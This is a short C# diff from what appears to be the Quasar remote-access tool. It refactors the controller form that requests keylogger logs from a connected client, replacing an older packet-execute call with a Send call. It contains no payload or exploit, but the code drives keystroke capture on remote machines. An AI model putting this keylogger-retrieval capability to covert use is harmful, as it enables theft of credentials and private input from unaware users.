@@ -1,6 +1,7 @@
 ﻿using System;
 using System.IO;
 using System.Windows.Forms;
+using Quasar.Common.Packets;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 
@@ -47,7 +48,7 @@ namespace xServer.Forms
             btnGetLogs.Enabled = false;
             lstLogs.Items.Clear();
 
-            new Core.Packets.ServerPackets.GetKeyloggerLogs().Execute(_connectClient);
+            _connectClient.Send(new GetKeyloggerLogs());
         }
 
         private void lstLogs_ItemActivate(object sender, EventArgs e)
